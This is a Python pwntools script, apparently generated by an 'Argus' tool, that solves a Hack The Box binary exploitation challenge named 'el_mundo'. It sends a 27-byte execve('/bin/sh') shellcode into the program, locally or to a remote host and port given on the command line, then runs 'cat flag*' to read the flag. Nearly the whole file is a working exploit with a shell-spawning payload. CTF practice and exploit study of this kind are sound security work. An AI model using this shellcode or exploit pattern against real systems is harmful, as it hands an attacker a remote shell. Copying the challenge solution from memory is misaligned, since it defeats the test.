#!/usr/bin/env python3
# Argus-generated ret2shellcode PoC scaffold
# Chain: chains.ret2shellcode_exec
# Binary: /mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo
#
# NX must be disabled — verify with checksec before running.
# Binary reads shellcode into a stack buffer and calls it as a function pointer.
# No overflow offset needed — send shellcode directly as the input payload.
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'warning'

fname = '/mnt/d/Repos/Security/Argus/vulntest/validation/htb/tracks/binary_exploitation/extracted/a12c7359-6c52-485c-a48b-caa2fe6b7fce/challenge/el_mundo'
BUF_SIZE = None  # TODO: determine buffer size from disasm

# 27-byte execve('/bin/sh') — fits tight buffers (shell-storm #806)
SHELLCODE = (
    b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
    b"\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
)  # 27 bytes

def exploit(target):
    assert BUF_SIZE is None or len(SHELLCODE) <= BUF_SIZE, (
        f"shellcode ({len(SHELLCODE)}B) > BUF_SIZE ({BUF_SIZE})"
    )
    target.sendlineafter(b'>', SHELLCODE)
    target.sendline(b'cat flag*')
    return target.recvall(timeout=3)

if __name__ == '__main__':
    import sys
    if len(sys.argv) >= 3:
        r = remote(sys.argv[1], int(sys.argv[2]))
    else:
        r = process(fname)
    out = exploit(r)
    flag = [l for l in out.decode(errors='replace').splitlines() if 'HTB' in l or 'flag' in l.lower()]
    print(flag[0] if flag else out[:200])
